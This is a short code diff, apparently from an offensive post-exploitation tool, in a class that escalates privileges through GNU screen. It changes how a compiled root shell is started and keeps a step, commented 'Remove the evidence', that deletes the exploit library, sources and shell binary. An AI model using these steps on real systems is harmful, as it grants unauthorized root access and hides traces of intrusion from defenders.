@@ -148,7 +148,7 @@ class ScreenMethod(Method):
         self.pty.run("popd")
 
         # Start the root shell!
-        self.pty.process(f"{rootshell}", delim=False)
+        self.pty.run(f"{rootshell}", wait=False)
 
         # Remove the evidence
         self.pty.run(f"unlink {libhack_so} {libhack_c} {rootshell_c} {rootshell}")
